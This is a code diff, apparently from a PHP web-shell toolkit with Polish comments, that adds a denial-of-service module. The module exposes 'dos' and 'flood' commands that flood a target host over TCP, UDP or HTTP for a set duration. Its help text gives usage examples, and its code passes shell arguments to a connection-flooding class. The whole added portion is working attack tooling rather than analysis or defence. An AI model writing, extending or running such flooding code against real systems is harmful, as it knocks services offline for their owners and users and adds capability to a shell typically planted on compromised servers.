@@ -466,7 +466,145 @@ class Dos
 
 			printf( "\r\n\r\nUstanowiono %d połączeń w ciągu %d sekund, prędkość: %d c/s\r\n", $i, $this -> iTime, $i / $this -> iTime  );
 		}
+	}
 
+}
+
+/**
+ * =================================================================================================
+ */
+
+/**
+ * ModuleDummy - Szkielet modulu
+ */
+class ModuleDos implements ShellInterface
+{
+	/**
+	 * Obiekt Shell
+	 *
+	 * @access private
+	 * @var    object
+	 */
+	private $oShell;
+
+	/**
+	 * Konstruktor
+	 *
+	 * @access public
+	 * @param  object $oShell Obiekt Shell
+	 * @return void
+	 */
+	public function __construct( Shell $oShell )
+	{
+		$this -> oShell = $oShell;
+	}
+
+	/**
+	 * Dostepna lista komend
+	 *
+	 * @access public
+	 * @return array
+	 */
+	public function getCommands()
+	{
+		return array
+		(
+			'dos',
+			'flood'
+		);
+	}
+
+	/**
+	 * Zwracanie wersji modulu
+	 *
+	 * @access public
+	 * @return string
+	 */
+	public function getVersion()
+	{
+		/**
+		 * Wersja Data Autor
+		 */
+		return '1.0 2011-06-04 - <krzotr@gmail.com>';
+	}
+
+	/**
+	 * Zwracanie pomocy modulu
+	 *
+	 * @access public
+	 * @return string
+	 */
+	public function getHelp()
+	{
+		return <<<DATA
+Denial Of Service - floodowanie tcp, udp i http
+
+	Typ:
+		tcp
+		udp
+		http
+
+	Opcje:
+		-n  wysłanie pakietu a następnie utworzenie nowego połączenia,
+		    przy wysłaniu 100MB mamy utworzonych 100 połączeń, bez tej opcji wszystkie dane
+		    zostaną wysłane przy pomocy jednego połączenia, dla 'http' połączenie będzie
+		    typu 'Keep-Alive' jeżeli jest dostępne
+
+	Użycie:
+		dos http http://localhost/auth/ czas_trwania_ataku_w_sekundach
+		dos typ host:port czas_trwania_ataku_w_sekundach
+
+	Przykład:
+		dos http http://localhost/auth/ 60
+		dos tcp localhost:80 60
+DATA;
+	}
+
+	/**
+	 * Wywolanie modulu
+	 *
+	 * @access public
+	 * @return string
+	 */
+	public function get()
+	{
+		/**
+		 * Czy modul jest zaladowany
+		 */
+		if( ! class_exists( 'Dos' ) )
+		{
+			return 'dos, flood - !!! moduł nie został załadowany';
+		}
+
+		/**
+		 * Help
+		 */
+		if( $this -> oShell -> iArgc !== 3 )
+		{
+			return $this -> getHelp();
+		}
+
+		try
+		{
+			ob_start();
+
+			header( 'Content-Type: text/plain; charset=utf-8', TRUE );
+
+			$oPasswordRecovery = new Dos();
+			$oPasswordRecovery -> setHost( $this -> oShell -> aArgv[1] )
+					   -> setType( $this -> oShell -> aArgv[0] )
+					   -> setTime( $this -> oShell -> aArgv[2] )
+					   -> setNewConnection( in_array( 'n', $this -> oShell -> aOptv ) )
+					   -> get();
+			ob_end_flush();
+			exit ;
+
+		}
+		catch( DosException $oException )
+		{
+			header( 'Content-Type: text/html; charset=utf-8', TRUE );
+			return $oException -> getMessage();
+		}
 	}
 
 }
